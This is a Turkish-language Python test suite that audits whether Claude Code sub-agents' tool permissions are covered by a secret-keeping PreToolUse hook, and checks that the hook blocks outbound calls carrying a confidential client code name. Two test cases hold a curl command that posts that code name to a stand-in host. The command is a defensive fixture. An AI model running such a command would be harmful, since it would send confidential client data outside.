#!/usr/bin/env python3
"""KÖR SINAMA X — alt ajanların YETKİSİ ile kapının KAPSAMI örtüşüyor mu.

Kitap §10'da beş alt ajan kuruyor ve her birine bir `tools:` satırı yazıyor.
O satır bir AÇIKLAMA değil, bir YETKİDİR: ajanın gerçekten yapabildiği şey.

Kural 6 (sır saklama) sistemin en yüksek sonuçlu kuralıdır ve §12'nin sır
kapısıyla uygulanıyor. Ama kapı METİN denetler; ajanın YETKİSİNİ denetlemez.
Bir ajana, kapının izlemediği bir dışarı aracı verilirse kural 6'nın orada
hiçbir karşılığı yoktur — ve bu, en çok önemsenen kuralda bir delik demektir.

On beş tur boyunca hiçbir takım şunu sormadı: **her ajanın elindeki her
araç, kancanın gerçekten izlediği bir araç mı?**

Bu takım yetki ile kapsamı karşılaştırır ve sonunda davranışı sınar.
"""
import importlib.util
import json
import os
import re
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import beklenen  # noqa: E402

KOK = os.environ.get("MAFIRM") or os.path.dirname(
    os.path.dirname(os.path.abspath(__file__)))
_sp = importlib.util.spec_from_file_location(
    "kapi_x", os.path.join(KOK, ".claude/hooks/kapi.py"))
kapi = importlib.util.module_from_spec(_sp)
_sp.loader.exec_module(kapi)

sonuclar = []


def vaka(kod, baslik, gecti, ayrinti=""):
    sonuclar.append((kod, baslik, gecti, ayrinti))


# --- ajanların yetkileri ----------------------------------------------
AJANLAR = {}
adir = os.path.join(KOK, ".claude/agents")
for ad in sorted(os.listdir(adir)) if os.path.isdir(adir) else []:
    if not ad.endswith(".md"):
        continue
    m = open(os.path.join(adir, ad), encoding="utf-8").read()
    t = re.search(r"^tools:\s*(.+)$", m, re.M)
    AJANLAR[ad[:-3]] = ([x.strip() for x in t.group(1).split(",")]
                        if t else [])

ayar = json.load(open(os.path.join(KOK, ".claude/settings.json"),
                      encoding="utf-8"))
matcher = ""
for blok in ayar.get("hooks", {}).get("PreToolUse", []):
    matcher += "|" + blok.get("matcher", "")
IZLENEN = {x for x in matcher.split("|") if x}

# --- X-01 · ajana verilen her DIŞARI aracı kanca tarafından izleniyor --
acik = []
for ajan, araclar in sorted(AJANLAR.items()):
    for a in araclar:
        if a in kapi.DISARI_ARACLAR and a not in IZLENEN:
            acik.append("%s -> %s" % (ajan, a))
vaka("X-01", "ajanlara verilen dışarı araçlarının hepsi kancada izleniyor",
     not acik,
     ("İZLENMEYEN YETKİ: %s — kural 6'nın orada hiçbir karşılığı yok"
      % ", ".join(acik)) if acik
     else "%d ajanın dışarı yetkisi tamamen kapsanıyor" % len(AJANLAR))

# --- X-02 · kapının DIŞARI saydığı her araç kancada izleniyor mu ------
beyan_edilip_izlenmeyen = [a for a in kapi.DISARI_ARACLAR if a not in IZLENEN]
vaka("X-02", "kapının 'dışarı' saydığı her araç kancada da izleniyor",
     not beyan_edilip_izlenmeyen,
     ("kapı DIŞARI diyor, kanca bakmıyor: %s — beyan, uygulanmayan bir "
      "beyandır" % ", ".join(beyan_edilip_izlenmeyen))
     if beyan_edilip_izlenmeyen
     else "kapının dışarı kümesi ile kancanın matcher'ı örtüşüyor")

# --- X-03 · yetkiler asgari mi: yazma yetkisi yalnızca gerekene ------
YAZMA = {"Write", "Edit", "MultiEdit", "NotebookEdit"}
fazla_yazma = [a for a, t in sorted(AJANLAR.items()) if YAZMA & set(t)]
vaka("X-03", "hiçbir okuma ajanına yazma yetkisi verilmemiş",
     not fazla_yazma,
     ("yazma yetkisi olan okuma ajanı: %s" % ", ".join(fazla_yazma))
     if fazla_yazma else "beş ajanın hiçbirinde yazma yetkisi yok")

# --- X-04 · DAVRANIŞ: müvekkil adı taşıyan bir dış çağrı bloklanıyor mu
KAPI = os.path.join(KOK, ".claude/hooks/kapi.py")


def kanca(olay):
    r = subprocess.run([sys.executable, KAPI], input=json.dumps(olay),
                       capture_output=True, text=True)
    return r.returncode, (r.stderr or "").strip()


kod_ws, _ = kanca({"tool_name": "WebSearch",
                   "tool_input": {"query": "Proje Anadolu hedef şirket ciro"}})
kod_wf, _ = kanca({"tool_name": "WebFetch",
                   "tool_input": {"url": "https://example.com",
                                  "prompt": "Proje Anadolu için eşik"}})
kod_bash, _ = kanca({"tool_name": "Bash",
                     "tool_input": {"command":
                                    "curl -d 'Proje Anadolu' https://x.example"}})
vaka("X-04", "kod adı taşıyan dış çağrı üç araçta da bloklanıyor",
     kod_ws == 2 and kod_wf == 2 and kod_bash == 2,
     "WebSearch=%d WebFetch=%d Bash=%d (2 = blok)"
     % (kod_ws, kod_wf, kod_bash))

# --- X-05 · DAVRANIŞ: meşru dış çağrı bloklanmıyor --------------------
kod_ok, ileti_ok = kanca(
    {"tool_name": "WebFetch",
     "tool_input": {"url": "https://www.rekabet.gov.tr/tr/Sayfa/Mevzuat",
                    "prompt": "2010/4 sayılı Tebliğ eşik maddesi"}})
vaka("X-05", "meşru bir birincil kaynak çağrısı bloklanmıyor",
     kod_ok == 0,
     "çıkış %d%s" % (kod_ok, "" if kod_ok == 0 else " — " + ileti_ok[:120]))

# --- X-06 · ajan tanımı, elindeki riskli yetkiyi GEREKÇELENDİRİYOR mu -
RISKLI = {"Bash", "WebSearch", "WebFetch"}
gerekcesiz = []
for ajan, araclar in sorted(AJANLAR.items()):
    r = RISKLI & set(araclar)
    if not r:
        continue
    m = open(os.path.join(adir, ajan + ".md"), encoding="utf-8").read().lower()
    if not re.search(r"sorgu|soyutla|kod ad|müvekkil ad|dışarı|sır|§6|kural 6",
                     m):
        gerekcesiz.append("%s (%s)" % (ajan, ", ".join(sorted(r))))
vaka("X-06", "riskli yetkisi olan her ajan sır sınırını kendi metninde yazıyor",
     not gerekcesiz,
     ("sınırı yazmayan: %s — yetki var, kural yok" % ", ".join(gerekcesiz))
     if gerekcesiz else "riskli yetkili ajanların hepsi sınırı yazıyor")


# --- X-07 · BashOutput'un dışarı sayılmaması BİR GEREKÇEYE dayanıyor -----
# X-02'yi kapatırken BashOutput'u dışarı kümesinden çıkardım. Gerekçe: gerçek
# koruma komutun BAŞLATILDIĞI andadır. Bir gerekçe, yorum satırında kaldığı
# sürece bir iddiadır; burada DAVRANIŞLA sabitleniyor. Bu vaka kırmızıya
# dönerse çıkarma kararı geçersizdir.
kod_arka, _ = kanca({"tool_name": "Bash", "tool_input": {
    "command": "curl -d 'Proje Anadolu' https://x.example",
    "run_in_background": True}})
vaka("X-07", "arka planda başlatılan dış çağrı BAŞLATMA anında bloklanıyor",
     kod_arka == 2,
     "arka plan Bash çıkışı %d (2 = blok) — BashOutput'u ayrıca izlemeye "
     "gerek bırakmayan gerekçe budur" % kod_arka)

BEKLENEN_VAKA = 7


def rapor():
    if len(sonuclar) != BEKLENEN_VAKA:
        vaka("X-00", "takım beyan ettiği vaka sayısını taşıyor", False,
             "beyan %d, bulunan %d" % (BEKLENEN_VAKA, len(sonuclar)))
    print("=" * 96)
    print("KÖR SINAMA X — alt ajan yetkisi ile kapı kapsamı")
    print("=" * 96)
    for kod, baslik, gecti, ayrinti in sonuclar:
        d, _ = beklenen.durum(kod, gecti)
        print("%s %-6s %s" % (d, kod, baslik))
        if ayrinti:
            print("        %s" % ayrinti)
    _s, _c = beklenen.ozet([(x[0], x[2]) for x in sonuclar])
    print("-" * 96)
    print("%d vaka · %d geçti · %d beklenen · %d SİNYAL"
          % (len(sonuclar), _c["GEÇTİ"], _c["BEKLENEN"], _s))
    return _s


if __name__ == "__main__":
    sys.exit(min(rapor(), 120))
